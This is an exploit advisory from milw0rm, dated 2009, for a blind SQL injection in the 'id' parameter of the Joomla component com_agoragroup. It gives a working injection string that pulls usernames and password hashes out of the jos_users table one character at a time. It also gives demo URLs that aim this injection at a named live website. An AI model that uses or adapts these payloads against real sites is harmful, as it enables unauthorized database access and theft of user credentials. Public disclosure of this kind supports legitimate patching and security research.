@@ -1,0 +1,48 @@
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+Joomla Component com_agoragroup (id) Blind SQL-injection Vulnerability
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+###################################################
+[+] Author        :  Chip D3 Bi0s
+[+] Greetz        :  d4n!ux x_jeshua + eCORE + Painboy + rayok3nt & N03!
+[+] Vulnerability :  Blind SQL injection 
+[+] Google Dork   :  imagine ;)
+--------------------------------------------------
+author       :     Russell...
+author Email :     chipdebios@gmail.com
+
+###################################################
+
+Example:
+http://localHost/path/index.php?option=com_agoragroup&con=groupdetail&id=2[SQL code]
+
+
+SQL code:
+and ascii(substring((SELECT concat(username,0x3a,password) from jos_users limit 0,1),1,1))>96
+
+
+DEMO:
+
+
+http://notaryzip.com/index.php?option=com_agoragroup&con=groupdetail&id=2+and+(select+substring(concat(1,password),1,1)+from+jos_users+limit+0,1)=1
+http://notaryzip.com/index.php?option=com_agoragroup&con=groupdetail&id=2+and+(select+substring(concat(1,username),1,1)+from+jos_users+limit+0,1)=1
+
+http://notaryzip.com/index.php?option=com_agoragroup&con=groupdetail&id=2+and+ascii(substring((SELECT+concat(username,0x3a,password)+from+jos_users+limit+0,1),1,1))=72
+
+
+
+etc, etc....
++++++++++++++++++++++++++++++++++++++++
+#[!] Produced in South America
++++++++++++++++++++++++++++++++++++++++
+
+<name>AgoraGroup</name>
+<version>0.3.5.3</version>
+<description>AgoraGroups- Groups component for Agora Forum v.3+</description>
+<license>http://www.gnu.org/licenses/gpl-2.0.html GNU/GPL</license>
+<author>The JoomlaMe team</author>
+<authoremail>info@easy-joomla.org</authoremail>
+<authorurl>http://www.easy-joomla.org</authorurl>
+
+# milw0rm.com [2009-05-27]
